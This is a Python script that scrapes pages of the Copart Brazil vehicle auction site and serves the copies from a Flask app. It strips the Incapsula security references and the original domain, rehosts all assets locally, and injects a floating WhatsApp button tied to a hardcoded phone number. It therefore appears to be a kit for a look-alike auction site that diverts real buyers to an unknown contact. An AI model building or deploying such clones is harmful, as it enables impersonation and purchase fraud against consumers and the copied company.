import os
import re
import json
import time
import hashlib
import urllib.parse
import gc
from collections import deque
from typing import Dict, Set, Optional, List, Tuple

import requests
from bs4 import BeautifulSoup

# Playwright só será usado quando absolutamente necessário
try:
    from playwright.sync_api import sync_playwright, TimeoutError as PlaywrightTimeoutError
    HAS_PLAYWRIGHT = True
except ImportError:
    HAS_PLAYWRIGHT = False
    print("[INFO] Playwright não instalado. Usando apenas requests.")

"""
Versão otimizada e corrigida para o Render
"""

BASE_URL = "https://www.copart.com.br"
HEADERS = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
    "Accept-Language": "pt-BR,pt;q=0.9,en;q=0.8",
    "Connection": "keep-alive"
}

TEMPLATE_DIR = os.path.join("templates", "copart")
STATIC_DIR = os.path.join("static", "copart")
ASSET_DIR = STATIC_DIR
API_DIR = os.path.join(STATIC_DIR, "api")
MANIFEST_PATH = os.path.join(API_DIR, "api_manifest.json")

# ===================== utils =====================

def only_digits(s: str) -> str:
    return re.sub(r"\D+", "", s or "")

def get_whatsapp_number() -> str:
    return only_digits(os.environ.get("WHATSAPP_NUMBER", "5511958462009"))

def normalizar_caminho(url_path: str) -> str:
    parsed = urllib.parse.urlparse(url_path)
    path = parsed.path
    if not path.startswith("/"):
        path = "/" + path
    return path.rstrip("/") or "/"

def sanitize_filename(url_path: str) -> str:
    path = url_path.split("?")[0].split("#")[0]
    path = path.replace("\\", "/").lstrip("/")
    clean_parts = []
    for part in os.path.normpath(path).split("/"):
        if part in ("", ".", ".."):
            continue
        clean_part = re.sub(r'[<>:"/\\|?*#&]', "_", part)
        if len(clean_part) > 50:
            clean_part = clean_part[:40] + "_" + hashlib.md5(part.encode()).hexdigest()[:8]
        clean_parts.append(clean_part)
    return "/".join(clean_parts) if clean_parts else "index"

def proteger_template(html: str) -> str:
    return re.sub(r"{{(.*?)}}", r"{% raw %}{{\1}}{% endraw %}", html)

# ===================== downloads =====================

def baixar_arquivo(url: str, destino: str) -> bool:
    if not url or url.startswith(("data:", "blob:", "javascript:")):
        return False

    try:
        destino = os.path.normpath(destino)
        if not destino.startswith(os.path.normpath(STATIC_DIR)):
            return False
        if os.path.exists(destino):
            return True
            
        os.makedirs(os.path.dirname(destino), exist_ok=True)
        
        resp = requests.get(url, headers=HEADERS, timeout=15, stream=True)
        if resp.status_code == 200:
            with open(destino, "wb") as f:
                for chunk in resp.iter_content(chunk_size=8192):
                    if chunk:
                        f.write(chunk)
            return True
    except Exception as e:
        print(f"[!] Erro ao baixar {url}: {e}")
    return False

def baixar_pagina_html(url: str) -> Optional[str]:
    """Baixa página HTML usando requests"""
    try:
        resp = requests.get(url, headers=HEADERS, timeout=30)
        if resp.status_code == 200:
            return resp.text
    except Exception as e:
        print(f"[!] Erro ao baixar página {url}: {e}")
    return None

# ===================== sitemap =====================

def carregar_links_sitemap() -> Set[str]:
    """Carrega links do sitemap"""
    sitemap_urls = ["/sitemap.xml"]
    
    all_links = set()
    
    for sitemap_url in sitemap_urls:
        full_url = urllib.parse.urljoin(BASE_URL, sitemap_url)
        
        try:
            resp = requests.get(full_url, headers=HEADERS, timeout=30)
            if resp.status_code != 200:
                continue
                
            soup = BeautifulSoup(resp.text, "xml")
            
            for loc in soup.find_all("loc"):
                if loc.text and not loc.text.endswith(".xml"):
                    path = urllib.parse.urlparse(loc.text.strip()).path
                    all_links.add(normalizar_caminho(path))
                        
        except Exception as e:
            print(f"[!] Erro no sitemap {sitemap_url}: {e}")
    
    return all_links

# ===================== processamento =====================

def coletar_links(soup: BeautifulSoup) -> Set[str]:
    links = set()
    for a in soup.find_all("a", href=True):
        href = a["href"].strip()
        if href.startswith(("javascript:", "mailto:", "tel:")):
            continue
            
        if href.startswith("http"):
            if href.startswith(BASE_URL):
                path = urllib.parse.urlparse(href).path
                links.add(normalizar_caminho(path))
        else:
            links.add(normalizar_caminho(href))
    
    return links

def remover_incapsula(html: str) -> str:
    """Remove todas as referências ao Incapsula/WAF"""
    patterns = [
        r'_Incapsula_Resource[^"]*',
        r'incapsula[^"]*',
        r'noscript.*?img.*?src=.*?Incapsula.*?<\/noscript>',
        r'<!--.*?Incapsula.*?-->',
    ]
    
    for pattern in patterns:
        html = re.sub(pattern, '', html, flags=re.IGNORECASE)
    
    return html

def processar_recursos(soup: BeautifulSoup, page_url: str) -> None:
    """Processa recursos removendo Incapsula"""
    for tag in soup.find_all(["link", "script", "img", "source"]):
        attr = "src" if tag.name in ["script", "img", "source"] else "href"
        url = tag.get(attr, "")
        
        if not url or url.startswith(("data:", "blob:", "javascript:")):
            continue
            
        # Pular recursos do Incapsula
        if "incapsula" in url.lower() or "_Incapsula_Resource" in url:
            tag.decompose()
            continue
            
        # Converter para URL absoluta
        if url.startswith("http"):
            if not url.startswith(BASE_URL):
                continue
            abs_url = url
        else:
            abs_url = urllib.parse.urljoin(BASE_URL, url)
        
        # Sanitizar nome do arquivo
        sanitized = sanitize_filename(url)
        local_path = os.path.join(ASSET_DIR, sanitized)
        
        # Baixar se não existir
        if not os.path.exists(local_path):
            baixar_arquivo(abs_url, local_path)
        
        # Atualizar tag
        tag[attr] = f"/static/copart/{sanitized}"

def inject_whatsapp_button(soup: BeautifulSoup, numero: str) -> None:
    if not soup.body or soup.select_one(".wa-link"):
        return

    # Criar a tag <a> primeiro
    a = soup.new_tag("a")
    a['href'] = f"https://wa.me/{numero}" if numero else "https://wa.me/"
    a['class'] = "wa-link"
    a['target'] = "_blank"
    a['style'] = "position:fixed;bottom:20px;right:20px;z-index:1000;background:#25D366;color:white;padding:10px;border-radius:50px;text-decoration:none;"
    
    # Adicionar texto simples em vez de SVG complexo
    a.string = "💬 WhatsApp"
    
    if soup.body:
        soup.body.append(a)

def garantir_html_base(soup: BeautifulSoup) -> None:
    """Garante que o HTML tenha estrutura básica correta"""
    if not soup.find('html'):
        return
        
    # Garantir charset UTF-8
    if soup.head:
        meta_charset = soup.head.find('meta', attrs={'charset': True})
        if not meta_charset:
            meta = soup.new_tag('meta')
            meta['charset'] = 'utf-8'
            soup.head.insert(0, meta)
        
        # Garantir viewport
        meta_viewport = soup.head.find('meta', attrs={'name': 'viewport'})
        if not meta_viewport:
            meta = soup.new_tag('meta')
            meta['name'] = 'viewport'
            meta['content'] = 'width=device-width, initial-scale=1.0'
            soup.head.insert(1, meta)

def salvar_pagina_html(url_path: str, html: str, numero_whatsapp: str) -> bool:
    """Processa e salva uma página HTML"""
    try:
        # Remover Incapsula primeiro
        html = remover_incapsula(html)
        
        # Remover domínio original
        html = html.replace(BASE_URL, "")
        html = html.replace("www.copart.com.br", "")
        
        soup = BeautifulSoup(html, "html.parser")
        
        # Garantir estrutura HTML básica
        garantir_html_base(soup)
        
        # Processar recursos
        processar_recursos(soup, BASE_URL + url_path)
        
        # Adicionar WhatsApp
        inject_whatsapp_button(soup, numero_whatsapp)
        
        # Sanitizar nome do arquivo
        slug = sanitize_filename(url_path)
        html_path = os.path.join(TEMPLATE_DIR, f"{slug}.html")
        os.makedirs(os.path.dirname(html_path), exist_ok=True)
        
        # Salvar HTML
        with open(html_path, "w", encoding="utf-8") as f:
            f.write(proteger_template(str(soup)))
        
        print(f"[✓] Página salva: {url_path}")
        return True
        
    except Exception as e:
        print(f"[!] Erro processando {url_path}: {e}")
        import traceback
        traceback.print_exc()
        return False

# ===================== main otimizada =====================

def salvar_site():
    """Versão otimizada para o Render"""
    
    # Criar diretórios
    os.makedirs(STATIC_DIR, exist_ok=True)
    os.makedirs(TEMPLATE_DIR, exist_ok=True)
    os.makedirs(API_DIR, exist_ok=True)
    
    print("[+] Coletando links importantes...")
    
    # Links essenciais para começar
    links_essenciais = {
        "/",
        "/about",
        "/contact", 
        "/services",
        "/vehicles",
        "/how-it-works"
    }
    
    try:
        sitemap_links = carregar_links_sitemap()
        links_essenciais.update(sitemap_links)
        print(f"[+] Encontrados {len(sitemap_links)} links no sitemap")
    except Exception as e:
        print(f"[!] Erro ao carregar sitemap: {e}")
        print("[!] Usando apenas links padrão")
    
    # Fila de processamento
    fila = deque(["/"])  # Página inicial primeiro
    for link in links_essenciais:
        if link not in fila:
            fila.append(link)
    
    visitados = set()
    numero_whatsapp = get_whatsapp_number()
    total_processados = 0
    max_paginas = 20  # Reduzido ainda mais para teste
    
    print(f"[+] Processando até {max_paginas} páginas...")
    print(f"[+] Fila inicial: {len(fila)} páginas")
    
    while fila and total_processados < max_paginas:
        url_path = fila.popleft()
        
        if url_path in visitados:
            continue
            
        print(f"[{total_processados+1}/{max_paginas}] Processando: {url_path}")
        
        # Baixar página
        full_url = BASE_URL + url_path
        html = baixar_pagina_html(full_url)
        
        if html:
            # Processar e salvar página
            if salvar_pagina_html(url_path, html, numero_whatsapp):
                # Coletar links da página
                soup = BeautifulSoup(html, "html.parser")
                novos_links = coletar_links(soup)
                
                # Adicionar novos links à fila (limitando)
                for link in list(novos_links)[:5]:  # Apenas 5 links por página
                    if (link not in visitados and link not in fila and 
                        len(link) > 1 and not link.startswith(('/api/', '/cdn-cgi/'))):
                        fila.append(link)
            
            visitados.add(url_path)
            total_processados += 1
            
            # Limpeza de memória
            if total_processados % 3 == 0:
                gc.collect()
                print(f"[PROGRESSO] {total_processados} páginas processadas, {len(fila)} na fila")
            
            # Pausa entre requisições
            time.sleep(1)
        else:
            print(f"[!] Falha ao baixar: {url_path}")
            # Adicionar à lista de visitados mesmo com falha para não tentar novamente
            visitados.add(url_path)
    
    print(f"[+] Processamento concluído! {total_processados} páginas salvas.")

# ===================== SERVER PARA RENDER =====================

def criar_app_flask():
    """Cria uma aplicação Flask simples para servir as páginas"""
    try:
        from flask import Flask, render_template, send_from_directory
        
        app = Flask(__name__)
        
        @app.route('/')
        def home():
            try:
                return render_template('copart/index.html')
            except:
                return "<h1>Bem-vindo ao CopartBR</h1><p>Site em espelhamento</p>"
        
        @app.route('/<path:path>')
        def serve_page(path):
            try:
                # Tentar encontrar a página exata
                return render_template(f'copart/{path}.html')
            except:
                try:
                    # Tentar encontrar como diretório/index
                    return render_template(f'copart/{path}/index.html')
                except:
                    # Fallback para página inicial
                    try:
                        return render_template('copart/index.html')
                    except:
                        return "<h1>Página não encontrada</h1><p><a href='/'>Voltar à página inicial</a></p>"
        
        @app.route('/static/copart/<path:path>')
        def serve_static(path):
            return send_from_directory(STATIC_DIR, path)
        
        return app
        
    except ImportError:
        print("[!] Flask não instalado. Instale com: pip install flask")
        return None

if __name__ == "__main__":
    # Verificar se estamos no Render (variável de ambiente específica)
    is_render = os.environ.get('RENDER', False)
    
    if is_render:
        print("[+] Ambiente Render detectado - Iniciando servidor...")
        app = criar_app_flask()
        if app:
            # No Render, usar a porta fornecida
            port = int(os.environ.get('PORT', 10000))
            app.run(host='0.0.0.0', port=port, debug=False)
        else:
            print("[!] Não foi possível iniciar o servidor Flask")
    else:
        # Ambiente local - fazer espelhamento
        print("[+] Ambiente local - Iniciando espelhamento...")
        salvar_site()
        print("[+] Espelhamento concluído!")
